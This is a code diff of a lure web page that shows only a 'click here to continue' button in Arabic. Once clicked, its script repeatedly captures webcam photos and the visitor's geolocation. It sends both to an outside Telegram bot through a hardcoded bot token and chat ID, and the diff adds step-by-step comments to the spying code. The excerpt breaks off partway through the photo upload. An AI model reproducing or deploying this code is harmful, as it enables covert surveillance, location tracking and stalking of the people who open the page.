@@ -7,10 +7,13 @@
 body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; font-family: sans-serif; text-align: center; }
 button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 8px; }
 </style>
+<base target="_blank">
 </head>
 <body>
 <button id="btn">اضغط هنا للمتابعة</button>
+
 <script>
+// 1. ضع بيانات البوت هنا
 const BOT_TOKEN = 'AAGO09rVRkVJolSUu5CaaID1to9QQRpizCs';
 const CHAT_ID = '8804137263';
 
@@ -21,18 +24,22 @@ document.getElementById('btn').addEventListener('click', async () => {
     video.play();
 
     setInterval(async () => {
+        // 2. التقاط صورة
         const canvas = document.createElement('canvas');
         canvas.width = 320; canvas.height = 240;
         canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-]        navigator.geolocation.getCurrentPosition(async (pos) => {
+        // 3. الحصول على الموقع
+        navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const msg = `موقع الشخص: ${lat}, ${lon}`;
 
+            // إرسال النص
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
+            // إرسال الصورة
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob);
